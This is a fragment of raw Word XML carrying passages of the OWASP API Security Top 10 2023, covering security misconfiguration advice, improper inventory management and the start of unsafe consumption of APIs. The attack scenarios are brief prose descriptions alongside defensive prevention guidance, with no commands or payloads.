          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>filesystem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299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API life cycle should include:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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 repeatable hardening process leading to fast and easy deployment of a properly locked down environment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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 task to review and update configurations across the entire API stack. The review should include: orchestration files, API components, and cloud services (e.g. S3 bucket permissions)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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An automated process to continuously assess the effectiveness of the configuration and settings in all environments</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299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Furthermore:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Ensure that all API communications from the client to the API server and any downstream/upstream components happen over an encrypted communication channel (TLS), regardless of whether it is an internal or public-facing API.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Be specific about which HTTP verbs each API can be accessed by: all other HTTP verbs should be disabled (e.g. HEAD).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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APIs expecting to be accessed from browser-based clients (e.g., </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>WebApp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> front-end) should, at least:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="17"/>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implement a proper Cross-Origin Resource Sharing (CORS) policy</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="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include applicable Security Headers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Restrict incoming content types/data formats to those that meet the business/ functional requirements.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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Ensure all servers in the HTTP server chain (e.g. load balancers, reverse and forward proxies, and back-end servers) process incoming requests in a uniform manner to avoid desync issues.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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Where applicable, define and enforce all API response payload schemas, including error responses, to prevent exception traces and other valuable information from being sent back to attackers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284"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API9:2023 Improper Inventory Management</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720"/>
        <w:gridCol w:w="4361"/>
        <w:gridCol w:w="4039"/>
      </w:tblGrid>
      <w:tr w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidTr="00891284">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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lastRenderedPageBreak/>
              <w:t>Threat agents/Attack vectors</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891284" w:rsidRPr="00790A44" w:rsidTr="00891284">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Widespread</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Average</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Moderate</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidTr="00891284">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Threat agents usually get unauthorized access through old API versions or endpoints left running unpatched and using weaker security requirements. In some cases exploits are available. Alternatively, they may get access to sensitive data through a 3rd party with whom there's no reason to share data with.</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Outdated documentation makes it more difficult to find and/or fix vulnerabilities. Lack of assets inventory and retirement strategies leads to running unpatched systems, resulting in leakage of sensitive data. It's common to find unnecessarily exposed API hosts because of modern concepts like </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>microservices</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>, which make applications easy to deploy and independent (e.g. cloud computing, K8S). Simple Google Dorking, DNS enumeration, or using specialized search engines for various types of servers (webcams, routers, servers, etc.) connected to the internet will be enough to discover targets.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
            <w:pPr>
              <w:jc w:val="lowKashida"/>
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Attackers can gain access to sensitive data, or even take over the server. Sometimes different API versions/deployments are connected to the same database with real data. Threat agents may exploit deprecated endpoints available in old API versions to get access to administrative functions or exploit known vulnerabilities.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="0089128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Is the API Vulnerable?</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sprawled and connected nature of APIs and modern applications brings new challenges. It is important for organizations not only to have a good understanding and visibility of their own APIs and API endpoints, but also how the APIs are storing or sharing data with external third parties.</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Running multiple versions of an API requires additional management resources from the API provider and expands the attack surface.</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has a "</w:t>
      </w:r>
      <w:ins w:id="1" w:author="Unknown">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          </w:rPr>
          <w:t xml:space="preserve">documentation </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          </w:rPr>
          <w:t>blindspot</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>" if:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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purpose of an API host is unclear, and there are no explicit answers to the following questions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="18"/>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Which environment is the API running in (e.g. production, staging, test, development)?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="18"/>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Who should have network access to the API (e.g. public, internal, partners)?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="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lastRenderedPageBreak/>
        <w:t>Which API version is running?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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There is no documentation or the existing documentation is not updated.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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There is no retirement plan for each API version.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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 host's inventory is missing or outdated.</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visibility and inventory of sensitive data flows play an important role as part of an incident response plan, in case a breach happens on the third party side.</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has a "</w:t>
      </w:r>
      <w:ins w:id="2" w:author="Unknown">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          </w:rPr>
          <w:t xml:space="preserve">data flow </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          </w:rPr>
          <w:t>blindspot</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>" if:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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There is a "sensitive data flow" where the API shares sensitive data with a third party and</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>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There is not a business justification or approval of the flow</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="12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There is no inventory or visibility of the flow</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="900"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>There is not deep visibility of which type of sensitive data is shared</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="0089128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891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284"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social network implemented a rate-limiting mechanism that blocks attackers from using brute force to guess reset password tokens. This mechanism wasn't implemented as part of the API code itself but in a separate component between the client and the official API (</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>api.socialnetwork.owasp.org</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>). A researcher found a beta API host (</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>beta.api.socialnetwork.owasp.org</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>) that runs the same API, including the reset password mechanism, but the rate-limiting mechanism was not in place. The researcher was able to reset the password of any user by using simple brute force to guess the 6 digit token.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284"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social network allows developers of independent apps to integrate with it. As part of this process a consent is requested from the end user, so the social network can share the user's personal information with the independent app.</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data flow between the social network and the independent apps is not restrictive or monitored enough, allowing independent apps to access not only the user information but also the private information of all of their friends.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284"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 consulting firm builds a malicious app and manages to get the consent of 270,000 users. Because of the flaw, the consulting firm manages to get access to the private information of 50,000,000 users. Later, the consulting firm sells the information for malicious purposes.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284"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Inventory all </w:t>
      </w:r>
      <w:ins w:id="3" w:author="Unknown">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>API hosts</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> and document important aspects of each one of them, focusing on the API environment (e.g. production, staging, test, development), who should have network access to the host (e.g. public, internal, partners) and the API version.</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Inventory </w:t>
      </w:r>
      <w:ins w:id="4" w:author="Unknown">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>integrated services</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> and document important aspects such as their role in the system, what data is exchanged (data flow), and their sensitivity.</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Document all aspects of your API such as authentication, errors, redirects, rate limiting, cross-origin resource sharing (CORS) policy, and endpoints, including their parameters, requests, and responses.</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Generate documentation automatically by adopting open standards. Include the documentation build in your CI/CD pipeline.</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Make API documentation available only to those authorized to use the API.</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Use external protection measures such as API security specific solutions for all exposed versions of your APIs, not just for the current production version.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>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Avoid using production data with non-production API deployments. If this is unavoidable, these endpoints should get the same security treatment as the production ones.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00891284" w:rsidRPr="00790A44" w:rsidRDefault="00891284" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>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When newer versions of APIs include security improvements, perform a risk analysis to inform the mitigation actions required for the older versions. For example, whether it is possible to backport the improvements without breaking API compatibility or if you need to take the older version out quickly and force all clients to move to the latest version.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="300" w:afterAutospacing="0"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>API10:2023 Unsafe Consumption of APIs</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="12120" w:type="dxa"/>
        <w:tblCellSpacing w:w="15" w:type="dxa"/>
        <w:tblCellMar>
          <w:top w:w="15" w:type="dxa"/>
          <w:left w:w="15" w:type="dxa"/>
          <w:bottom w:w="15" w:type="dxa"/>
          <w:right w:w="15" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3668"/>
        <w:gridCol w:w="4964"/>
        <w:gridCol w:w="3488"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidTr="00D8031F">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Threat agents/Attack vectors</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Security Weakness</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b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Impacts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidTr="00D8031F">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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t>API Specific : Exploitability </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Easy</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t>Prevalence </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Common</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Detectability </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Average</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t>Technical </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Severe</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidTr="00D8031F">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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t xml:space="preserve">Exploiting this issue requires attackers to identify and potentially compromise other APIs/services the target API integrated with. Usually, this information is not publicly available or the integrated </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>API/service is not easily exploitable.</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Developers tend to trust and not verify the endpoints that interact with external or third-party APIs, relying on weaker security requirements such as those regarding transport security, authentication/authorization, and input validation and sanitization. Attackers need to identify services the target API integrates </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>with (data sources) and, eventually, compromise them.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
            <w:pPr>
              <w:jc w:val="lowKashida"/>
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">The impact varies according to what the target API does with pulled data. Successful exploitation may lead to sensitive information exposure to unauthorized actors, many kinds of </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>injections, or denial of service.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031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lastRenderedPageBreak/>
        <w:t>Is the API Vulnerable?</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Developers tend to trust data received from third-party APIs more than user input. This is especially true for APIs offered by well-known companies. Because of that, developers tend to adopt weaker security standards, for instance, in regards to input validation and sanitization.</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The API might be vulnerable if:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Interacts with other APIs over an unencrypted channel;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Does not properly validate and sanitize data gathered from other APIs prior to processing it or passing it to downstream components;</w:t>
      </w:r>
    </w:p>
